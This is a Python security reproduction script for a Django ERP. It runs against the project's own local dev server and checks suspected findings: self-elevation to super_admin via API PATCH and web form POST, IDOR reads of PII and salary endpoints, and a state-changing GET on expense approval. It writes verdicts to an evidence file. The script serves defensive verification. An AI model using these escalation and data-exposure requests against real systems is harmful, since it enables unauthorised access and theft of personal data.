"""Reproduce the priority (Critical/High) suspected findings against the live dev server.

Run from repo root with the server up:
    env -u PYTHONPATH DJANGO_DEBUG=True /d/samana/.venv312/Scripts/python.exe tests/repro/reproduce_findings.py

Uses django ORM for SETUP/cleanup of test data only (never to bypass assertions),
and `requests` over HTTP against http://127.0.0.1:8000 for the actual reproduction.
Prints ACTUAL vs EXPECTED + a verdict, and writes evidence to tests/repro/evidence.md.
"""
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))
os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'samana_erp.settings')
os.environ.setdefault('DJANGO_DEBUG', 'True')

import django  # noqa: E402

django.setup()

import json  # noqa: E402
import requests  # noqa: E402
from django.contrib.auth.models import User  # noqa: E402
from core.models import UserProfile  # noqa: E402

BASE = 'http://127.0.0.1:8000'
EVIDENCE = []


def record(fid, title, verdict, actual, expected, note=''):
    EVIDENCE.append(dict(id=fid, title=title, verdict=verdict, actual=actual,
                         expected=expected, note=note))
    print(f'\n=== {fid}: {title} ===')
    print(f'  VERDICT : {verdict}')
    print(f'  ACTUAL  : {actual}')
    print(f'  EXPECTED: {expected}')
    if note:
        print(f'  NOTE    : {note}')


def new_session(username, password):
    """Log in via the DRF api_login and return (requests.Session, csrftoken)."""
    s = requests.Session()
    s.get(BASE + '/api/auth/csrf/', timeout=15)
    csrftoken = s.cookies.get('csrftoken', '')
    headers = {'X-CSRFToken': csrftoken, 'Referer': BASE}
    r = s.post(BASE + '/api/auth/login/',
               data={'username': username, 'password': password}, headers=headers, timeout=15)
    return s, csrftoken, r


def api_headers(csrftoken):
    return {'X-CSRFToken': csrftoken, 'Referer': BASE, 'Content-Type': 'application/json'}


# ────────────────────────────────────────────────────────────────────────────────
# R1 — API privilege escalation: staff self-elevates role via PATCH /api/profile/
# ────────────────────────────────────────────────────────────────────────────────
def r1_api_privilege_escalation():
    from core.models import UserProfile as UP
    sales = User.objects.get(username='qa_sales')
    UP.objects.update_or_create(user=sales, defaults={'role': 'sales'})  # ensure baseline

    s, tok, login = new_session('qa_sales', 'admin123')
    login_role = login.json().get('role') if login.status_code == 200 else None

    r = s.patch(BASE + '/api/profile/update_profile/',
                data=json.dumps({'role': 'super_admin'}), headers=api_headers(tok), timeout=15)
    me = s.get(BASE + '/api/auth/me/', headers=api_headers(tok), timeout=15).json()
    role_after = me.get('role')

    # cleanup: restore baseline
    UP.objects.filter(user=sales).update(role='sales')

    escalated = (r.status_code == 200) and (role_after == 'super_admin')
    record('R1', 'API privilege escalation (staff -> super_admin)',
           'CONFIRMED' if escalated else 'NOT-CONFIRMED',
           f'login_role={login_role}, PATCH status={r.status_code}, role_after={role_after}',
           'PATCH role should be rejected/ignored; role must remain "sales"',
           f'PATCH body: {r.text[:200]}')


# ────────────────────────────────────────────────────────────────────────────────
# R2 — Web privilege escalation: portal customer self-creates super_admin profile
# ────────────────────────────────────────────────────────────────────────────────
def r2_web_privilege_escalation():
    cu = User.objects.get(username='qa_customer')
    UserProfile.objects.filter(user=cu).delete()  # ensure no profile

    s, tok, login = new_session('qa_customer', 'admin123')
    # GET profile page to confirm no profile, then POST role=super_admin
    data = {
        'first_name': 'QA', 'last_name': 'Customer', 'email': 'qa.customer.qa@example.com',
        'is_active': 'on',
        'role': 'super_admin', 'theme': 'professional-blue',
        'csrfmiddlewaretoken': tok,
    }
    r = s.post(BASE + '/profile/', data=data, headers={'Referer': BASE}, timeout=15)

    profile = UserProfile.objects.filter(user=cu).first()
    role_after = profile.role if profile else None

    escalated = (profile is not None) and (role_after == 'super_admin')
    record('R2', 'Web privilege escalation (portal customer -> super_admin profile)',
           'CONFIRMED' if escalated else 'NOT-CONFIRMED',
           f'POST status={r.status_code}, profile_created={profile is not None}, role_after={role_after}',
           'A portal customer must NOT be able to grant themselves super_admin',
           '')

    # cleanup: remove the escalated profile so qa_customer stays profile-less
    UserProfile.objects.filter(user=cu).delete()


# ────────────────────────────────────────────────────────────────────────────────
# R3/R4 — IDOR / PII read-open: portal customer reads financial + PII endpoints
# ────────────────────────────────────────────────────────────────────────────────
def r3_idor_pii_read_open():
    s, tok, login = new_session('qa_customer', 'admin123')

    endpoints = [
        ('customers', '/api/customers/', ['cnic', 'phone']),
        ('users', '/api/users/', ['profile']),
        ('bookings', '/api/bookings/', ['total_amount']),
        ('payments', '/api/payments/', ['amount']),
        ('employees', '/api/employees/', ['cnic', 'phone']),
        ('audit-logs', '/api/audit-logs/', ['ip_address']),
        ('leads', '/api/leads/', ['phone']),
        ('agents', '/api/agents/', ['cnic']),
        ('receipts', '/api/receipts/', ['amount']),
        ('company-settings-summary', '/api/company-settings/summary/', ['revenue']),
    ]
    lines = []
    for name, path, keys in endpoints:
        r = s.get(BASE + path, timeout=15)
        body = r.json() if r.status_code == 200 and r.text else None
        leaked = False
        if isinstance(body, list) and body:
            leaked = any(k in body[0] for k in keys)
        elif isinstance(body, dict):
            leaked = any(k in body for k in keys)
        lines.append(f'{name}: HTTP {r.status_code}, leaked_pii={leaked}')

    # A customer reading any of these confirms systemic IDOR/PII exposure
    record('R3/R4', 'IDOR / PII read-open (portal customer reads protected endpoints)',
           'CONFIRMED (see note)',
           '; '.join(lines),
           'Portal customer should get 403 for all of these; should see only their own data',
           'CONFIRMED if any endpoint returns 200 with other records/PII.')


# ────────────────────────────────────────────────────────────────────────────────
# R5 — HR API read-open (salary/CNIC exposed)
# ────────────────────────────────────────────────────────────────────────────────
def r5_hr_read_open():
    s, tok, login = new_session('qa_customer', 'admin123')
    r = s.get(BASE + '/api/employees/', timeout=15)
    body = r.json() if r.status_code == 200 and r.text else None
    leaked = False
    keys = []
    if isinstance(body, list) and body:
        sample = body[0]
        keys = [k for k in ('cnic', 'phone', 'email', 'basic_salary', 'salary', 'designation') if k in sample]
        leaked = bool(keys)
    record('R5', 'HR API read-open (portal customer reads employee PII/salary)',
           'CONFIRMED' if (r.status_code == 200 and leaked) else 'NOT-CONFIRMED',
           f'HTTP {r.status_code}, fields_present={keys}',
           'Portal customer should get 403 on /api/employees/',
           '')


# ────────────────────────────────────────────────────────────────────────────────
# R6 — CSRF via GET on expense approve (mutates on GET)
# ────────────────────────────────────────────────────────────────────────────────
def r6_csrf_via_get_expense():
    from expenses.models import Expense
    from properties.models import Project
    from finance.models import AccountTransaction
    from datetime import date

    proj = Project.objects.first()
    if proj is None:
        record('R6', 'CSRF via GET on expense approve', 'SKIPPED', 'no Project exists',
               'create a project first', '')
        return

    exp = Expense.objects.create(project=proj, description='QA CSRF-via-GET repro',
                                 amount=1000, expense_type='internal',
                                 expense_date=date.today(), status='pending')
    s, tok, login = new_session('qa_accounts', 'admin123')

    # The bug: a plain GET mutates state (no POST required, no CSRF on GET).
    r = s.get(BASE + f'/expenses/{exp.pk}/approve/', headers={'Referer': BASE}, timeout=15)

    exp.refresh_from_db()
    ledger = AccountTransaction.objects.filter(reference_type='Expense', reference_id=exp.pk).exists()
    mutated = (exp.status == 'approved') and ledger

    record('R6', 'CSRF via GET on expense approve',
           'CONFIRMED' if mutated else 'NOT-CONFIRMED',
           f'GET status={r.status_code}, expense.status={exp.status}, ledger_posted={ledger}',
           'GET must NOT change state; approve should require POST + CSRF',
           f'final URL={r.url}')

    # cleanup
    AccountTransaction.objects.filter(reference_type='Expense', reference_id=exp.pk).delete()
    exp.delete()


def main():
    print('=' * 72)
    print('Samana ERP — priority finding reproduction')
    print('=' * 72)
    r1_api_privilege_escalation()
    r2_web_privilege_escalation()
    r3_idor_pii_read_open()
    r5_hr_read_open()
    r6_csrf_via_get_expense()

    # persist evidence
    out = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'evidence.md')
    with open(out, 'w', encoding='utf-8') as f:
        f.write('# Priority finding reproduction evidence\n\n')
        f.write('Generated against http://127.0.0.1:8000 (local dev server).\n\n')
        for e in EVIDENCE:
            f.write(f"## {e['id']} — {e['title']}\n")
            f.write(f"- **Verdict:** {e['verdict']}\n")
            f.write(f"- **Actual:** {e['actual']}\n")
            f.write(f"- **Expected:** {e['expected']}\n")
            if e['note']:
                f.write(f"- **Note:** {e['note']}\n")
            f.write('\n')
    print(f'\nEvidence written to {out}')


if __name__ == '__main__':
    main()
